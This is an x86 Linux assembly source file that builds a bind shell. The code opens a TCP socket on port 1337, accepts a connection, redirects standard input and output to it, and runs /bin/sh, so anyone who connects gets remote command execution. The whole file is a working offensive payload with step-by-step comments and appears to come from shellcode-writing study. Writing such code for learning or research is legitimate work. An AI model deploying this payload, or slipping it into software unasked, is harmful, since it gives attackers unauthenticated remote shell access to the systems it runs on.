	; Filename: bind_shell.nasm

global _start

	; | EAX | system call numer ( + return data ) |
	; | EBX | 1st |
	; | ECX | 2nd |
	; | EDX | 3rd |
	; | ESI | 4th |
	; | EDI | 5th |
	; | EBP | 6th |

section .text
_start:

	; Create socket
	xor ebx, ebx
	mul ebx             ; zero out eax, and edx
	xor ecx, ecx

	mov al, 0x66  		; syscall: int socketcall(int call, unsigned long *args)	
	mov bl, 0x1			; int socket(int domain, int type, int protocol)  : SYS_SOCKET (0x01)	

						; *args: push in reverse order to stack
	push 0x6			; protocol = IPPROTO_TCP (6) - 
	push 0x1			; type = SOCK_STREAM (1)
	push 0x2			; domain = AF_INET (2)
	mov ecx, esp

	int 0x80
	mov edi, eax 		; store socket ptr to edi in edx

	; bind socket
	xor eax, eax
	xor ebx, ebx
	xor ecx, ecx

	mov al, 0x66  		; int socketcall(int call, unsigned long *args)	;
	mov bl, 0x2			; bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen)	;


						; source: man 7 ip
						; struct sockaddr_in {
						;     sa_family_t    sin_family	; /* address family: AF_INET */
						;     in_port_t      sin_port	;   /* port in network byte order */
						;     struct in_addr sin_addr	;   /* internet address */
						; }	;

						; /* Internet address. */
						; struct in_addr {
						;     uint32_t       s_addr	;     /* address in network byte order */
						; }	;

					
						; setup stack for [sockaddr *addr] structure
	push ecx			; INADDRY_ANY
	push word 0x3905	; port 1337 = 0x539  = rev.. 0x3905
	push word 0x2		; sa_family_t = AF_INET
	mov ecx, esp		; move pointer to structure into ecx 

						; bind() - push args to stack
	push 0x10			; addrlen
	push ecx			; ptr socaddr *addr (on stack)
	push edi			; ptr to socket from above

	mov ecx, esp
	int 0x80		


	; listen
	xor eax, eax
	xor ebx, ebx
	xor ecx, ecx

	mov al, 0x66  		; int socketcall(int call, unsigned long *args)	;
	mov bl, 0x4			; int listen(int sockfd, int backlog)	;

	push ecx			; backlog (0)
	push edi 			; socket ptr

	mov ecx, esp
	int 0x80



	; accept
	xor eax, eax
	xor ebx, ebx
	xor ecx, ecx

	mov al, 0x66  		; int socketcall(int call, unsigned long *args)	;
	mov bl, 0x5			; int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen)	;

	push ecx
	push ecx
	push edi 			; socket ptr

	mov ecx, esp
	int 0x80


	; REDIRECT I/O
	; file descriptor : fd = (stdin = 0, stdout = 1, stderr = 2)
	; Will loop through all 3 file descriptors and redirct output to socket

						 
	xchg ebx, eax		; mov file descriptor for the accepted socket to ebx

	xor ecx, ecx		; zero out ecx
	mov cl, 0x2 		; set the counter (for loop)
	
loop:					; Loop through all file descriptors
	mov al, 0x3f		; syscall: dup2 (63)  -- NOTE: eax was cleared above. Good to reduce # of instructions.
	int 0x80			; exec dup2
	dec ecx				; decrement counter
	jns loop			; jump until SF is set ; (jmp if positive)


	; Execute /bin/sh
	mov al, 0xb			; syscall: execve (11) int execve(const char *pathname, char *const argv[], char *const envp[]);

	xor edx, edx		; envp (NULL)
	push edx			; push 0x00 null terminator for string
	push 0x68732f2f		; "hs//"   LITTLE ENDIAN
	push 0x6e69622f 	; "nib/"


	mov ebx, esp		; pathname: point ebx to stack
	mov ecx, edx		; NULL

	int 0x80			; execute execve

